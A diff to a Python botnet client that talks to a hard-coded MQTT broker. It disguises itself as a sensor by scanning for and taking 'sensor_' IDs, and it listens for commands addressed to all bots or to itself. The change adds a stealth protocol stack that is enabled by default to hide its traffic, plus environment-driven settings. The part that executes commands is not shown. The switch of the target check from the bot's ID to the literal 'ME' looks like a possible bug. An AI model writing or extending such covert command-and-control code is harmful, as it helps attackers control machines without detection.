@@ -7,15 +7,17 @@ import random
 import time
 import paho.mqtt.client as mqtt
 import json
-from protocol import ProtocolStack
+from protocol import ProtocolStack, StealthProtocolStack, deserialize_packet
 
 # --- CONFIGURATION ---
 BROKER = "147.32.82.209"
 PORT = 1883
 TOPIC = "sensors"
 SALT = "S4ur0ns_S3cr3t_S4lt_2025"
-SEND_INTERVAL = 1.0
+SEND_INTERVAL = float(os.environ.get("SEND_INTERVAL", 1.0))
 ID_SCAN_TIME = 2.0  # Seconds to scan for existing IDs
+USE_STEALTH_MODE = os.environ.get("USE_STEALTH_MODE", "True").lower() == "true"
+DEBUG = os.environ.get("DEBUG", "False").lower() == "true"
 
 
 def scan_existing_ids(broker: str, port: int, topic: str, scan_time: float) -> set:
@@ -24,7 +26,7 @@ def scan_existing_ids(broker: str, port: int, topic: str, scan_time: float) -> s
     
     def on_message(client, userdata, msg):
         try:
-            data = json.loads(msg.payload.decode())
+            data = deserialize_packet(msg.payload)
             sensor_id = data.get("sensor_id", "")
             if sensor_id.startswith("sensor_"):
                 existing_ids.add(sensor_id)
@@ -76,7 +78,7 @@ def handle_message(message: dict):
     # Only handle commands targeted at us
     if msg_type != "command":
         return
-    if target != "ALL" and target != BOT_ID:
+    if target != "ALL" and target != "ME":
         return
     
     command = message.get("cmd")
@@ -127,19 +129,23 @@ if __name__ == "__main__":
     BOT_ID = generate_unique_id(existing_ids)
     
     # Create and start protocol stack
-    stack = ProtocolStack(
+    StackClass = StealthProtocolStack if USE_STEALTH_MODE else ProtocolStack
+    stack = StackClass(
         node_id=BOT_ID,
         broker=BROKER,
         port=PORT,
         topic=TOPIC,
         salt=SALT,
-        send_interval=SEND_INTERVAL
+        send_interval=SEND_INTERVAL,
+        debug=DEBUG
     )
+    
+    mode_str = "STEALTH" if USE_STEALTH_MODE else "FINGERPRINT"
     
     # Register message handler
     stack.on_receive(handle_message)
     
-    print(f"[*] Bot {BOT_ID} listening (sending every {SEND_INTERVAL}s)...")
+    print(f"[*] Bot {BOT_ID} [{mode_str}] (sending every {SEND_INTERVAL}s)...")
     stack.start()
     
     try:
